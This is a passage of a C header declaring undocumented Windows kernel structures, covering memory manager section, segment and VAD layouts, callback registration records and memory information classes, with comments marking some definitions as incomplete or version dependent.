    KSPIN_LOCK SpinLock;
} ERESOURCE, *PERESOURCE;

/*
* WDM END
*/

/*
* MM START
*/
typedef ULONG MMSECTION_FLAGS2;

typedef struct _MMEXTEND_INFO {
    ULONG_PTR CommittedSize;
    ULONG ReferenceCount;
} MMEXTEND_INFO, * PMMEXTEND_INFO; /* size: 0x0010 */

//
// Flags definitions valid only for Windows 10.
//
typedef struct _MMSECTION_FLAGS {
    struct {
        UINT BeingDeleted : 1; /* bit position: 0 */
        UINT BeingCreated : 1; /* bit position: 1 */
        UINT BeingPurged : 1; /* bit position: 2 */
        UINT NoModifiedWriting : 1; /* bit position: 3 */
        UINT FailAllIo : 1; /* bit position: 4 */
        UINT Image : 1; /* bit position: 5 */
        UINT Based : 1; /* bit position: 6 */
        UINT File : 1; /* bit position: 7 */
        UINT AttemptingDelete : 1; /* bit position: 8 */
        UINT PrefetchCreated : 1; /* bit position: 9 */
        UINT PhysicalMemory : 1; /* bit position: 10 */
        UINT ImageControlAreaOnRemovableMedia : 1; /* bit position: 11 */  //CopyOnWrite
        UINT Reserve : 1; /* bit position: 12 */
        UINT Commit : 1; /* bit position: 13 */
        UINT NoChange : 1; /* bit position: 14 */
        UINT WasPurged : 1; /* bit position: 15 */
        UINT UserReference : 1; /* bit position: 16 */
        UINT GlobalMemory : 1; /* bit position: 17 */
        UINT DeleteOnClose : 1; /* bit position: 18 */
        UINT FilePointerNull : 1; /* bit position: 19 */
        UINT PreferredNode : 6; /* bit position: 20 */
        UINT GlobalOnlyPerSession : 1; /* bit position: 26 */
        UINT UserWritable : 1; /* bit position: 27 */
        UINT SystemVaAllocated : 1; /* bit position: 28 */
        UINT PreferredFsCompressionBoundary : 1; /* bit position: 29 */
        UINT UsingFileExtents : 1; /* bit position: 30 */
        UINT PageSize64K : 1; /* bit position: 31 */
    };
} MMSECTION_FLAGS, * PMMSECTION_FLAGS; /* size: 0x0004 */

//
// Flags definitions valid only for Windows 10.
//
typedef struct _SEGMENT_FLAGS {
    union {
        struct {
            USHORT TotalNumberOfPtes4132 : 10; /* bit position: 0 */
            USHORT Spare0 : 2; /* bit position: 10 */
            USHORT LargePages : 1; /* bit position: 12 */
            USHORT DebugSymbolsLoaded : 1; /* bit position: 13 */
            USHORT WriteCombined : 1; /* bit position: 14 */
            USHORT NoCache : 1; /* bit position: 15 */
        }; 
        USHORT Short0;
    }; /* size: 0x0002 */
    union {
        struct {
            UCHAR FloppyMedia : 1; /* bit position: 0 */
            UCHAR DefaultProtectionMask : 5; /* bit position: 1 */
            UCHAR Binary32 : 1; /* bit position: 6 */
            UCHAR ContainsDebug : 1; /* bit position: 7 */
        };
        UCHAR UChar1;
    }; /* size: 0x0001 */
    union {
        struct {
            UCHAR ForceCollision : 1; /* bit position: 0 */
            UCHAR ImageSigningType : 3; /* bit position: 1 */
            UCHAR ImageSigningLevel : 4; /* bit position: 4 */
        };
        UCHAR UChar2;
    };
} SEGMENT_FLAGS, * PSEGMENT_FLAGS; /* size: 0x0004 */

typedef struct _MI_SYSTEM_CACHE_VIEW_ATTRIBUTES {
    union {
        ULONGLONG NumberOfPtes : 6;
        ULONGLONG PartitionId : 10;
        ULONGLONG Spare : 2;
        ULONGLONG SectionOffset : 48;
    } u1;
} MI_SYSTEM_CACHE_VIEW_ATTRIBUTES, * PMI_SYSTEM_CACHE_VIEW_ATTRIBUTES;

#define VIEW_MAP_TYPE_PROCESS         1
#define VIEW_MAP_TYPE_SESSION         2
#define VIEW_MAP_TYPE_SYSTEM_CACHE    3

typedef struct _MI_REVERSE_VIEW_MAP {
    struct _LIST_ENTRY ViewLinks;
    union {
        VOID* SystemCacheVa;
        VOID* SessionViewVa;
        struct _EPROCESS* VadsProcess;
        ULONG Type : 2;
    } u1;
    union {
        struct _SUBSECTION* Subsection;
        ULONG SubsectionType : 1;
    } u2;
    union {
        struct _MI_SYSTEM_CACHE_VIEW_ATTRIBUTES SystemCacheAttributes;
        ULONGLONG AllAttributes; //Since W11
        ULONGLONG SectionOffset;
    } u3;
} MI_REVERSE_VIEW_MAP, * PMI_REVERSE_VIEW_MAP; /* size: 0x0028 */

typedef struct _RTL_BALANCED_NODE {
    union
    {
        struct _RTL_BALANCED_NODE* Children[2];
        struct
        {
            struct _RTL_BALANCED_NODE* Left;
            struct _RTL_BALANCED_NODE* Right;
        };
    };
    union
    {
        UCHAR Red : 1;
        UCHAR Balance : 2;
        ULONG_PTR ParentValue;
    };
} RTL_BALANCED_NODE, * PRTL_BALANCED_NODE;

typedef struct _SEGMENT {

    struct _CONTROL_AREA* ControlArea;
    unsigned long TotalNumberOfPtes;
    SEGMENT_FLAGS SegmentFlags;
    ULONG_PTR NumberOfCommittedPages;
    ULONG_PTR SizeOfSegment;

    union {
        struct _MMEXTEND_INFO* ExtendInfo;
        void* BasedAddress;
    } u1;

    EX_PUSH_LOCK SegmentLock;

    union {
        union {
            ULONG_PTR ImageCommitment;
            ULONG CreatingProcessId;
        };
    } u2;

    union {
        union {
            struct _MI_SECTION_IMAGE_INFORMATION* ImageInformation;
            void* FirstMappedVa;
        };
    } u3;

    struct _MMPTE* PrototypePte;

} SEGMENT, * PSEGMENT;  /* size: 0x0048 */

typedef struct _CONTROL_AREA_COMPAT {

    SEGMENT* Segment;
    LIST_ENTRY ListHead;
    ULONG_PTR NumberOfSectionReferences;
    ULONG_PTR NumberOfPfnReferences;
    ULONG_PTR NumberOfMappedViews;
    ULONG_PTR NumberOfUserReferences;

    union {
        union {
            ULONG LongFlags;
            MMSECTION_FLAGS Flags;
        };
    } u;

    union {
        union {
            ULONG LongFlags;
            MMSECTION_FLAGS2 Flags;
        };
    } u1;

    EX_FAST_REF FilePointer;
    volatile LONG ControlAreaLock;
    ULONG ModifiedWriteCount;
    struct _MI_CONTROL_AREA_WAIT_BLOCK* WaitList;

    union
    {
        struct
        {
            union
            {
                ULONG NumberOfSystemCacheViews;
                ULONG ImageRelocationStartBit;
            };
            union
            {
                volatile LONG WritableUserReferences;
                struct // version dependent, this bitset is not valid for w11
                {
                    unsigned long ImageRelocationSizeIn64k : 16; /* bit position: 0 */
                    unsigned long LargePage : 1; /* bit position: 16 */
                    unsigned long SystemImage : 1; /* bit position: 17 */
                    unsigned long StrongCode : 2; /* bit position: 18 */
                    unsigned long CantMove : 1; /* bit position: 20 */
                    unsigned long BitMap : 2; /* bit position: 21 */
                    unsigned long ImageActive : 1; /* bit position: 23 */
                };
            };
            union
            {
                ULONG FlushInProgressCount;
                ULONG NumberOfSubsections;
                struct _MI_IMAGE_SECURITY_REFERENCE* SeImageStub;
            };
        } e2;
    } u2;

    //
    // Incomplete definition, tail is version dependent.
    //

} CONTROL_AREA_COMPAT, * PCONTROL_AREA_COMPAT;

//
// N.B. 
// Only valid for Win10.
// Change between Win10 versions.
//
typedef struct _MMVAD_SHORT {
    union
    {
        struct
        {
            struct _MMVAD_SHORT* NextVad;
            void* ExtraCreateInfo;
        };
        struct _RTL_BALANCED_NODE VadNode;
    };

    ULONG StartingVpn;
    ULONG EndingVpn;
    UCHAR StartingVpnHigh;
    UCHAR EndingVpnHigh;
    UCHAR CommitChargeHigh;
    UCHAR SpareNT64VadUChar;
    LONG ReferenceCount;
    EX_PUSH_LOCK PushLock;

    ULONG LongFlags;
    ULONG LongFlags1;

    struct _MI_VAD_EVENT_BLOCK* EventList;

} MMVAD_SHORT, * PMMVAD_SHORT;  /* size: 0x0040 */

typedef struct _MI_VAD_SEQUENTIAL_INFO {

    struct {
#if defined(_AMD64_)
        ULONG_PTR Length : 12; /* bit position: 0 */
        ULONG_PTR Vpn : 52; /* bit position: 12 */
#else
        ULONG Length : 11; /* bit position: 0 */
        ULONG Vpn : 21; /* bit position: 11 */
#endif
    };

} MI_VAD_SEQUENTIAL_INFO, * PMI_VAD_SEQUENTIAL_INFO;

//
// N.B. 
// Only valid for Win10.
// Flags meanings change between Win10 versions.
//
typedef struct _MMVAD_FLAGS {
    struct
    {
        ULONG VadType : 3; /* bit position: 0 */
        ULONG Protection : 5; /* bit position: 3 */
        ULONG PreferredNode : 6; /* bit position: 8 */
        ULONG PrivateMemory : 1; /* bit position: 14 */
        ULONG PrivateFixup : 1; /* bit position: 15 */
        ULONG Enclave : 1; /* bit position: 16 */
        ULONG PageSize64K : 1; /* bit position: 17 */
        ULONG RfgControlStack : 1; /* bit position: 18 */
        ULONG Spare : 8; /* bit position: 19 */
        ULONG NoChange : 1; /* bit position: 27 */
        ULONG ManySubsections : 1; /* bit position: 28 */
        ULONG DeleteInProgress : 1; /* bit position: 29 */
        ULONG LockContended : 1; /* bit position: 30 */
        ULONG Lock : 1; /* bit position: 31 */
    };
} MMVAD_FLAGS, * PMMVAD_FLAGS; /* size: 0x0004 */

//
// N.B. 
// Only valid for Win10.
// Flags meanings change between Win10 versions.
//
typedef struct _MMVAD_FLAGS1 {
    struct
    {
        ULONG CommitCharge : 31; /* bit position: 0 */
        ULONG MemCommit : 1; /* bit position: 31 */
    };
} MMVAD_FLAGS1, * PMMVAD_FLAGS1; /* size: 0x0004 */

//
// N.B. 
// Only valid for Win10.
// Flags meanings change between Win10 versions.
//
typedef struct _MMVAD_FLAGS2 {
    struct
    {
        ULONG FileOffset : 24; /* bit position: 0 */
        ULONG Large : 1; /* bit position: 24 */
        ULONG TrimBehind : 1; /* bit position: 25 */
        ULONG Inherit : 1; /* bit position: 26 */
        ULONG NoValidationNeeded : 1; /* bit position: 27 */
        ULONG PrivateDemandZero : 1; /* bit position: 28 */
        ULONG Spare : 3; /* bit position: 29 */
    };
} MMVAD_FLAGS2, * PMMVAD_FLAGS2; /* size: 0x0004 */

typedef struct _MMVAD {

    struct _MMVAD_SHORT Core;

    union
    {
        union
        {
            ULONG LongFlags2;
            volatile struct _MMVAD_FLAGS2 VadFlags2;
        };
    } u2;

    struct _SUBSECTION* Subsection;
    struct _MMPTE* FirstPrototypePte;
    struct _MMPTE* LastContiguousPte;
    LIST_ENTRY ViewLinks;
    struct _EPROCESS* VadsProcess;

    union
    {
        union
        {
            struct _MI_VAD_SEQUENTIAL_INFO SequentialVa;
            struct _MMEXTEND_INFO* ExtendedInfo;
        };
    } u4;

    FILE_OBJECT* FileObject;

} MMVAD, * PMMVAD; /* size: 0x0088 */

typedef struct _MMVIEW {
    ULONGLONG Entry;
    union {
        ULONGLONG Writable : 1;
        struct _CONTROL_AREA* ControlArea; 
    };
    LIST_ENTRY ViewLinks; 
    PVOID SessionViewVa;
    ULONG SessionId;
} MMVIEW, *PMMVIEW;

typedef struct _MI_IMAGE_ENTRY_IN_SESSION {
    LIST_ENTRY Link;
    PVOID Address;

    //
    // Incomplete and incorrect.
    //

} MI_IMAGE_ENTRY_IN_SESSION, * PMI_IMAGE_ENTRY_IN_SESSION;

typedef struct _SUBSECTION_COMPAT {

    struct _CONTROL_AREA* ControlArea;
    struct _MMPTE* SubsectionBase;
    struct _SUBSECTION* NextSubsection;

    //
    // Incomplete definition.
    //

} SUBSECTION_COMPAT, * PSUBSECTION_COMPAT;

//
// This is Windows 10 only Section Object definition.
// 
// N.B. It completely differs from anything else.
//
typedef struct _SECTION_COMPAT {

    RTL_BALANCED_NODE SectionNode;
    ULONG_PTR StartingVpn;
    ULONG_PTR EndingVpn;

    union {
        union {
            struct _CONTROL_AREA* ControlArea;
            struct _FILE_OBJECT* FileObject;
            struct {
                ULONG_PTR RemoteImageFileObject : 1; /* bit position: 0 */
                ULONG_PTR RemoteDataFileObject : 1; /* bit position: 1 */
            };
        };
    } u1;

    ULONG_PTR SizeOfSection;

    union {
        ULONG LongFlags;
        MMSECTION_FLAGS Flags;
    } u;

    struct {
        ULONG InitialPageProtection : 12; /* bit position: 0 */
        ULONG SessionId : 19; /* bit position: 12 */
        ULONG NoValidationNeeded : 1; /* bit position: 31 */
    };

} SECTION_COMPAT, * PSECTION_COMPAT;  /* size: 0x0040 */

/*
* MM END
*/

/*
*  Configuration Manager control vector
*/
typedef struct _CM_SYSTEM_CONTROL_VECTOR_V1 {
    PWSTR  KeyPath;
    PWSTR  ValueName;
    PVOID  Buffer;
    PULONG BufferLength;
    PULONG Type;
} CM_SYSTEM_CONTROL_VECTOR_V1, * PCM_SYSTEM_CONTROL_VECTOR_V1;

//
// Since Windows 10 RS4
//
typedef struct _CM_SYSTEM_CONTROL_VECTOR_V2 {
    PWSTR  KeyPath;
    PWSTR  ValueName;
    PVOID  Buffer;
    PULONG BufferLength;
    PULONG Type;
    ULONG Flags; //0 or 1 depends on flag from LOADER_PARAMETER_BLOCK attached hives
    ULONG Spare0;
} CM_SYSTEM_CONTROL_VECTOR_V2, * PCM_SYSTEM_CONTROL_VECTOR_V2;

/*
** Callbacks START
*/

typedef NTSTATUS(*PEX_CALLBACK_FUNCTION) (
    IN PVOID CallbackContext,
    IN PVOID Argument1,
    IN PVOID Argument2
    );

typedef VOID(NTAPI* PEX_HOST_NOTIFICATION) (
    _In_ ULONG NotificationType,
    _In_opt_ PVOID Context);

typedef struct _EX_EXTENSION_INFORMATION_V1 {
    USHORT Id;
    USHORT Version;
    USHORT FunctionCount;
} EX_EXTENSION_INFORMATION_V1, * PEX_EXTENSION_INFORMATION_V1;

typedef struct _EX_EXTENSION_VERSION {
    USHORT MajorVersion;
    USHORT MinorVersion;
} EX_EXTENSION_VERSION, * PEX_EXTENSION_VERSION;

typedef struct _EX_EXTENSION_INFORMATION_V2 {
    USHORT Id;
    EX_EXTENSION_VERSION Version;
    USHORT FunctionCount;
} EX_EXTENSION_INFORMATION_V2, * PEX_EXTENSION_INFORMATION_V2;

typedef struct _EX_HOST_TABLE {
    EX_EXTENSION_INFORMATION_V2 HostInformation;
    PVOID FunctionTable; //calbacks
} EX_HOST_TABLE, * PEX_HOST_TABLE;

typedef struct _EX_HOST_PARAMS {
    EX_EXTENSION_INFORMATION_V1 HostInformation;
    POOL_TYPE PoolType;
    PVOID HostTable;
    PVOID NotificationRoutine;
    PVOID NotificationContext;
} EX_HOST_PARAMS, * PEX_HOST_PARAMS;

typedef struct _EX_HOST_ENTRY_V1 {
    LIST_ENTRY ListEntry;
    LONG RefCounter;
    EX_HOST_PARAMS HostParameters;
    EX_RUNDOWN_REF RundownProtection;
    EX_PUSH_LOCK PushLock;
    PVOID FunctionTable; //callbacks
    ULONG Flags;
} EX_HOST_ENTRY_V1, * PEX_HOST_ENTRY_V1;

typedef struct _EX_HOST_ENTRY_V2 {
    LIST_ENTRY ListEntry;
    EX_EXTENSION_INFORMATION_V2 HostInformation;
    ULONG64 RefCounter;
    EX_PUSH_LOCK PushLock;
    PEX_HOST_TABLE HostTablesPtr;
    USHORT HostTablesCount;
    PEX_HOST_TABLE CurrentHostTableEntry; //only set when an extension registers
    PVOID NotificationRoutine;
    PVOID NotificationContext;
    EX_EXTENSION_VERSION ExtensionVersion;
    EX_RUNDOWN_REF RundownProtection;
    PVOID FunctionTable;
    USHORT ExtensionTableFunctionCount;
    ULONG Pad;
    ULONG Flags;
    EX_HOST_TABLE HostTables[1];
} EX_HOST_ENTRY_V2, * PEX_HOST_ENTRY_V2;

typedef struct _EX_EXTENSION_REGISTRATION {
    EX_EXTENSION_INFORMATION_V1 Information;
    PVOID FunctionTable;
    PVOID* HostTable;
    PDRIVER_OBJECT DriverObject;
} EX_EXTENSION_REGISTRATION, * PEX_EXTENSION_REGISTRATION;

typedef struct _EX_CALLBACK {
    EX_FAST_REF RoutineBlock;
} EX_CALLBACK, *PEX_CALLBACK;

typedef struct _EX_CALLBACK_ROUTINE_BLOCK {
    EX_RUNDOWN_REF RundownProtect;
    PVOID Function; //PEX_CALLBACK_FUNCTION
    PVOID Context;
} EX_CALLBACK_ROUTINE_BLOCK, *PEX_CALLBACK_ROUTINE_BLOCK;

typedef struct _KBUGCHECK_CALLBACK_RECORD {
    LIST_ENTRY Entry;
    PVOID CallbackRoutine;
    PVOID Buffer;
    ULONG Length;
    PUCHAR Component;
    ULONG_PTR Checksum;
    UCHAR State;
} KBUGCHECK_CALLBACK_RECORD, *PKBUGCHECK_CALLBACK_RECORD;

typedef enum _KBUGCHECK_CALLBACK_REASON {
    KbCallbackInvalid,
    KbCallbackReserved1,
    KbCallbackSecondaryDumpData,
    KbCallbackDumpIo,
    KbCallbackAddPages,
    KbCallbackSecondaryMultiPartDumpData,
    KbCallbackRemovePages,
    KbCallbackTriageDumpData
} KBUGCHECK_CALLBACK_REASON;

typedef struct _KBUGCHECK_REASON_CALLBACK_RECORD {
    LIST_ENTRY Entry;
    PVOID CallbackRoutine;
    PUCHAR Component;
    ULONG_PTR Checksum;
    KBUGCHECK_CALLBACK_REASON Reason;
    UCHAR State;
} KBUGCHECK_REASON_CALLBACK_RECORD, *PKBUGCHECK_REASON_CALLBACK_RECORD;

typedef struct _CM_CALLBACK_CONTEXT_BLOCK {
    LIST_ENTRY CallbackListEntry;
    LONG PreCallListHead;
    LARGE_INTEGER Cookie;
    PVOID CallerContext; 
    PEX_CALLBACK_FUNCTION Function;
    UNICODE_STRING Altitude;
    LIST_ENTRY ObjectContextListHead;
} CM_CALLBACK_CONTEXT_BLOCK, *PCM_CALLBACK_CONTEXT_BLOCK;

typedef struct _SEP_LOGON_SESSION_TERMINATED_NOTIFICATION {
    struct _SEP_LOGON_SESSION_TERMINATED_NOTIFICATION *Next;
    PVOID CallbackRoutine; //PSE_LOGON_SESSION_TERMINATED_ROUTINE
} SEP_LOGON_SESSION_TERMINATED_NOTIFICATION, *PSEP_LOGON_SESSION_TERMINATED_NOTIFICATION;

typedef struct _NOTIFICATION_PACKET {
    LIST_ENTRY ListEntry;
    PVOID DriverObject; //PDRIVER_OBJECT
    PVOID NotificationRoutine; //PDRIVER_FS_NOTIFICATION
} NOTIFICATION_PACKET, *PNOTIFICATION_PACKET;

typedef struct _SHUTDOWN_PACKET {
    LIST_ENTRY ListEntry;
    PVOID DeviceObject; //PDEVICE_OBJECT
} SHUTDOWN_PACKET, *PSHUTDOWN_PACKET;

#define EX_CALLBACK_SIGNATURE 'llaC'

typedef struct _CALLBACK_OBJECT {
    ULONG Signature;
    KSPIN_LOCK Lock;
    LIST_ENTRY RegisteredCallbacks;
    BOOLEAN AllowMultipleCallbacks;
    UCHAR reserved[3];
} CALLBACK_OBJECT, *PCALLBACK_OBJECT;

// Since 8.1
typedef struct _CALLBACK_OBJECT_V2 {
    ULONG Signature;
    KSPIN_LOCK Lock;
    LIST_ENTRY RegisteredCallbacks;
    BOOLEAN AllowMultipleCallbacks;
    LIST_ENTRY ExpCallbackList;
} CALLBACK_OBJECT_V2, * PCALLBACK_OBJECT_V2;

typedef struct _CALLBACK_REGISTRATION {
    LIST_ENTRY Link;
    PCALLBACK_OBJECT CallbackObject;
    PVOID CallbackFunction; //PCALLBACK_FUNCTION
    PVOID CallbackContext;
    ULONG Busy;
    BOOLEAN UnregisterWaiting;
} CALLBACK_REGISTRATION, *PCALLBACK_REGISTRATION;

typedef ULONG OB_OPERATION;

#define OB_OPERATION_HANDLE_CREATE              0x00000001
#define OB_OPERATION_HANDLE_DUPLICATE           0x00000002

typedef struct _OB_CALLBACK_CONTEXT_BLOCK {
    LIST_ENTRY CallbackListEntry;
    OB_OPERATION Operations;
    ULONG Flags;
    struct _OB_REGISTRATION* Registration;
    POBJECT_TYPE ObjectType;
    PVOID PreCallback;
    PVOID PostCallback;
    EX_RUNDOWN_REF RundownReference;
} OB_CALLBACK_CONTEXT_BLOCK, *POB_CALLBACK_CONTEXT_BLOCK;

typedef struct _OB_REGISTRATION {
    USHORT Version;
    USHORT RegistrationCount;
    PVOID  RegistrationContext;
    UNICODE_STRING Altitude;
    OB_CALLBACK_CONTEXT_BLOCK* CallbackContext;
} OB_REGISTRATION, * POB_REGISTRATION;

#define PO_POWER_SETTINGS_REGISTRATION_TAG 'teSP'

typedef struct _POP_POWER_SETTING_REGISTRATION_V1 {
    LIST_ENTRY Link;
    ULONG Tag;
    PVOID CallbackThread; //PKTHREAD
    UCHAR UnregisterOnReturn;
    UCHAR UnregisterPending;
    GUID Guid;
    PVOID LastValue; //PPOP_POWER_SETTING_VALUE
    PVOID Callback;
    PVOID Context;
    PDEVICE_OBJECT DeviceObject;
} POP_POWER_SETTING_REGISTRATION_V1, *PPOP_POWER_SETTING_REGISTRATION_V1;

//
// WARNING: this structure definition is incomplete. 
// Tail is incorrect/incomplete for newest Win10 versions.
//
typedef struct _POP_POWER_SETTING_REGISTRATION_V2 {
    LIST_ENTRY Link;
    ULONG Tag;
    PVOID CallbackThread; //PKTHREAD   
    UCHAR UnregisterOnReturn;
    UCHAR UnregisterPending;
    GUID Guid;
    GUID Guid2;
    PVOID LastValue; //PPOP_POWER_SETTING_VALUE
    PVOID Callback;
    PVOID Context;
    PDEVICE_OBJECT DeviceObject;
} POP_POWER_SETTING_REGISTRATION_V2, *PPOP_POWER_SETTING_REGISTRATION_V2;

typedef struct _RTL_CALLBACK_REGISTER {
    ULONG Flags;
    EX_RUNDOWN_REF RundownReference;
    PVOID DebugPrintCallback;
    LIST_ENTRY ListEntry;
} RTL_CALLBACK_REGISTER, *PRTL_CALLBACK_REGISTER;

typedef
VOID
(*PPO_COALESCING_CALLBACK) (
    _In_ ULONG Reason,
    _In_ PDEVICE_OBJECT DeviceObject,
    _In_ PVOID Context);

typedef struct _PO_COALESCING_CALLBACK_V1 {
    EX_PUSH_LOCK PushLock;
    PVOID CoalescingCallback;
    PVOID SelfPtr;
    PPO_COALESCING_CALLBACK Callback;
    BOOLEAN ClientOrServer;
    PVOID Context;
} PO_COALESCING_CALLBACK_V1, * PPO_COALESCING_CALLBACK_V1;

typedef struct _PO_COALESCING_CALLBACK_V2 {
    EX_PUSH_LOCK PushLock;
    PVOID CoalescingCallback;
    PVOID SelfPtr;
    PPO_COALESCING_CALLBACK Callback;
    BOOLEAN ClientOrServer;
    PVOID Context;
    LIST_ENTRY Link;
    EX_CALLBACK ExCallback;
} PO_COALESCING_CALLBACK_V2, * PPO_COALESCING_CALLBACK_V2;

typedef
BOOLEAN
(*PNMI_CALLBACK)(
    __in_opt PVOID Context,
    __in BOOLEAN Handled
    );

typedef struct _KNMI_HANDLER_CALLBACK {
    struct _KNMI_HANDLER_CALLBACK* Next;
    PNMI_CALLBACK Callback;
    PVOID Context;
    PVOID Handle;
} KNMI_HANDLER_CALLBACK, * PKNMI_HANDLER_CALLBACK;

typedef
NTSTATUS
(NTAPI* SILO_MONITOR_CREATE_CALLBACK)(
    _In_ PESILO Silo
    );

typedef
VOID
(NTAPI* SILO_MONITOR_TERMINATE_CALLBACK)(
    _In_ PESILO Silo
    );

#define SILO_MONITOR_REGISTRATION_VERSION (1)

typedef struct _SERVER_SILO_MONITOR {
    LIST_ENTRY ListEntry;
    UCHAR Version;
    BOOLEAN MonitorHost;
    BOOLEAN MonitorExistingSilos;
    UCHAR Reserved[5];
    SILO_MONITOR_CREATE_CALLBACK CreateCallback;
    SILO_MONITOR_TERMINATE_CALLBACK TerminateCallback;
    union {
        PUNICODE_STRING DriverObjectName;
        PUNICODE_STRING ComponentName;
    };
} SERVER_SILO_MONITOR, * PSERVER_SILO_MONITOR;

//
// Errata Manager
//
typedef struct _EMP_CALLBACK_DB_RECORD {
    GUID CallbackId;
    PVOID CallbackFunc;
    LONG_PTR CallbackFuncReference;
    PVOID Context;
    SINGLE_LIST_ENTRY List;
    SINGLE_LIST_ENTRY CallbackDependencyListHead;
    ULONG NumberOfStrings;
    ULONG NumberOfNumerics;
    ULONG NumberOfEntries;
    struct _EMP_ENTRY_DB_RECORD* EntryList[1];
} EMP_CALLBACK_DB_RECORD, * PEMP_CALLBACK_DB_RECORD;

typedef struct _EMP_CALLBACK_LIST_ENTRY {
    EMP_CALLBACK_DB_RECORD* CallbackRecord;
    SINGLE_LIST_ENTRY CallbackListEntry;
} EMP_CALLBACK_LIST_ENTRY, * PEMP_CALLBACK_LIST_ENTRY;

typedef enum _IO_NOTIFICATION_EVENT_CATEGORY {
    EventCategoryReserved,
    EventCategoryHardwareProfileChange,
    EventCategoryDeviceInterfaceChange,
    EventCategoryTargetDeviceChange
} IO_NOTIFICATION_EVENT_CATEGORY;

typedef
NTSTATUS
(*PDRIVER_NOTIFICATION_CALLBACK_ROUTINE) (
    IN PVOID NotificationStructure,
    IN PVOID Context
    );

typedef struct _KGUARDED_MUTEX {
    LONG Count;
    PKTHREAD Owner;
    ULONG Contention;
    KEVENT Event;
    union {
        struct {
            SHORT KernelApcDisable;
            SHORT SpecialApcDisable;
        };

        ULONG CombinedApcDisable;
    };

} KGUARDED_MUTEX, * PKGUARDED_MUTEX;

typedef struct _DEVICE_CLASS_NOTIFY_ENTRY {

    // 
    // Header entries 
    // 

    LIST_ENTRY ListEntry;
    IO_NOTIFICATION_EVENT_CATEGORY EventCategory;
    ULONG SessionId;
    HANDLE SessionHandle;
    PDRIVER_NOTIFICATION_CALLBACK_ROUTINE CallbackRoutine;
    PVOID Context;
    PDRIVER_OBJECT DriverObject;
    USHORT RefCount;
    BOOLEAN Unregistered;
    PKGUARDED_MUTEX Lock;
    PERESOURCE EntryLock;
    // 
    // ClassGuid - the guid of the device class we are interested in 
    // 

    GUID ClassGuid;

} DEVICE_CLASS_NOTIFY_ENTRY, * PDEVICE_CLASS_NOTIFY_ENTRY;

/*
** Callbacks END
*/

/*
*  NTQSI Modules START
*/

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULE_INFORMATION_EX {
    USHORT NextOffset;
    RTL_PROCESS_MODULE_INFORMATION BaseInfo;
    ULONG ImageChecksum;
    ULONG TimeDateStamp;
    PVOID DefaultBase;
} RTL_PROCESS_MODULE_INFORMATION_EX, *PRTL_PROCESS_MODULE_INFORMATION_EX;

typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

/*
*	NTQSI Modules END
*/

/*
** Virtual Memory START
*/

typedef enum _MEMORY_INFORMATION_CLASS {
    MemoryBasicInformation = 0,
    MemoryWorkingSetInformation,
    MemoryMappedFilenameInformation,
    MemoryRegionInformation,
    MemoryWorkingSetExInformation,
    MemorySharedCommitInformation,
    MemoryImageInformation,
    MemoryRegionInformationEx,
    MemoryPrivilegedBasicInformation,
    MemoryEnclaveImageInformation,
    MemoryBasicInformationCapped,
    MemoryPhysicalContiguityInformation,
    MemoryBadInformation,
    MemoryBadInformationAllProcesses,
    MaxMemoryInfoClass
} MEMORY_INFORMATION_CLASS, *PMEMORY_INFORMATION_CLASS;

typedef enum _VIRTUAL_MEMORY_INFORMATION_CLASS {
    VmPrefetchInformation,
    VmPagePriorityInformation,
    VmCfgCallTargetInformation,
    VmPageDirtyStateInformation
} VIRTUAL_MEMORY_INFORMATION_CLASS;

typedef struct _MEMORY_REGION_INFORMATION {
    PVOID AllocationBase;
    ULONG AllocationProtect;
    union
    {
        ULONG RegionType;
        struct
        {
            ULONG Private : 1;
            ULONG MappedDataFile : 1;
            ULONG MappedImage : 1;
            ULONG MappedPageFile : 1;
            ULONG MappedPhysical : 1;
            ULONG DirectMapped : 1;
            ULONG SoftwareEnclave : 1;
            ULONG PageSize64K : 1;
            ULONG Reserved : 24;
        };
    };
    SIZE_T RegionSize;
    SIZE_T CommitSize;
} MEMORY_REGION_INFORMATION, *PMEMORY_REGION_INFORMATION;

typedef struct _MEMORY_REGION_INFORMATION_V2 {
    PVOID AllocationBase;
    ULONG AllocationProtect;
    union
    {
        ULONG RegionType;
        struct
        {
            ULONG Private : 1;
            ULONG MappedDataFile : 1;
            ULONG MappedImage : 1;
            ULONG MappedPageFile : 1;
            ULONG MappedPhysical : 1;
            ULONG DirectMapped : 1;
            ULONG SoftwareEnclave : 1; // RS3
            ULONG PageSize64K : 1;
            ULONG Reserved : 24;
        };
    };
    SIZE_T RegionSize;
    SIZE_T CommitSize;
    ULONG_PTR PartitionId; // 19H1
} MEMORY_REGION_INFORMATION_V2, * PMEMORY_REGION_INFORMATION_V2;

typedef struct _MEMORY_REGION_INFORMATION_V3 {
    PVOID AllocationBase;
    ULONG AllocationProtect;
    union
    {
        ULONG RegionType;
        struct
        {
            ULONG Private : 1;
            ULONG MappedDataFile : 1;
            ULONG MappedImage : 1;
            ULONG MappedPageFile : 1;
            ULONG MappedPhysical : 1;
            ULONG DirectMapped : 1;
            ULONG SoftwareEnclave : 1; // RS3
            ULONG PageSize64K : 1;
            ULONG PlaceholderReservation : 1; // RS4
            ULONG MappedAwe : 1; // 21H1
            ULONG MappedWriteWatch : 1;
            ULONG PageSizeLarge : 1;
            ULONG PageSizeHuge : 1;
            ULONG Reserved : 19;
        };
    };
    SIZE_T RegionSize;
    SIZE_T CommitSize;
    ULONG_PTR PartitionId; // 19H1
    ULONG_PTR NodePreference; // 20H1
} MEMORY_REGION_INFORMATION_V3, * PMEMORY_REGION_INFORMATION_V3;

typedef struct _MEMORY_RANGE_ENTRY {
    PVOID VirtualAddress;
    SIZE_T NumberOfBytes;
} MEMORY_RANGE_ENTRY, *PMEMORY_RANGE_ENTRY;

typedef struct _MEMORY_IMAGE_INFORMATION {
    PVOID ImageBase;
    SIZE_T SizeOfImage;
    union
    {
        ULONG ImageFlags;
        struct
        {
            ULONG ImagePartialMap : 1;
            ULONG ImageNotExecutable : 1;
            ULONG ImageSigningLevel : 4; // RS3
            ULONG ImageExtensionPresent : 1; // 24H2
